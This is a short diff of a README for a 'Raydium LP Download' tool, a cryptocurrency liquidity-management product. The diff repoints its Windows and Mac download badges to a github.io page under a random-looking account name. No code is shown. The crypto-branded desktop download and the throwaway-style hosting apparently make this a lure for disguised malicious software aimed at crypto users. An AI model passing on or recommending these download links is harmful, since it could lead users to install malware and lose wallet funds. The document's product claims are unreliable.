@@ -10,8 +10,8 @@ Raydium LP Download provides professional tools for managing liquidity positions
 
 <div align="center">  
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://raydium-download.github.io/.github/)  
-[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://montiko384.github.io/.github/raydium)  
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://nelsonsarah19712691.github.io/.github/raydium-lp)  
+[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://nelsonsarah19712691.github.io/.github/raydium-lp)  
 
 </div>  
 
